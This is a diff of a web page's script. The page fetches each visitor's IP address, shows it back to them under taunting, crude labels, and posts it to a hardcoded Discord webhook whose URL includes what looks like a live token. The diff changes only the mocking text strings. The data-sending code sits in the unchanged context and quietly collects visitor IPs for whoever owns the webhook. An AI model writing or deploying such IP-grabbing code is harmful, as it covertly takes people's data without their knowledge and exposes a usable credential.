@@ -35,7 +35,7 @@
         .then(response => response.json())
         .then(data => {
           const ipAddress = data.ip;
-          ipAddressElement.innerText = `loadgaysexscript : ${ipAddress}`;
+          ipAddressElement.innerText = `ou mai gad blud checked the source of the script :skulo:, me when ${ipAddress}`;
           sendToDiscordWebhook(ipAddress);
         })
         .catch(error => {
@@ -47,7 +47,7 @@
     function sendToDiscordWebhook(ipAddress) {
       const webhookURL = "https://discord.com/api/webhooks/1142963647543509104/RGhXfoi_BLVaPdH852cA4PT7n06sexBRpFyUY8c37VBos1eWzLZAxZXiP2FBNy4INUcx";
       const data = {
-        content: `ou mai gad blud checked the source of the script :skulo:  ${ipAddress}`
+        content: `skibididopdopdopyesyes ip adress :  ${ipAddress}`
       };
 
       fetch(webhookURL, {
@@ -68,7 +68,7 @@
 </head>
 <body>
   <div class="ip-container">
-    <div class="ip-label">n u h    u h</div>
+    <div class="ip-label">nuh uh what the fuck</div>
     <div class="ip-address" id="ipAddress"></div>
   </div>
 </body>
